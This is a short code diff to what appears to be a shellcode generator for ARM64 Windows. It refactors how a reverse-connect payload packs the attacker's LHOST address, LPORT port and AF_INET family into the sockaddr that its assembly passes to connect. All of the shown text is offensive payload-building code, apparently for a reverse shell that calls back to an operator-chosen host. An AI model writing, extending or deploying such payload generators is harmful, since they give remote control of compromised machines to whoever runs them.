@@ -245,6 +245,10 @@ get_{imports[func]}:
             lport = int(argv_dict["LPORT"])
 
 
+        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
+        sin_port = struct.pack('<H', lport).hex()
+        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+
         shellcode = f"""
 _start:
     stp x29, x30, [sp, #-{self.stack_space}]!
@@ -296,7 +300,7 @@ call_connect:
     mov x0, x26
     add x1, x29, #-{self.storage_offsets['name']}
     mov x2, {ctypes.sizeof(ws2def.sockaddr)}
-    ldr x25, ={hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
+    ldr x25, ={sin_addr}{sin_port}{sin_family}
     str x25, [x1]
     eor x25, x25, x25
     str x25, [x1, #0x08]
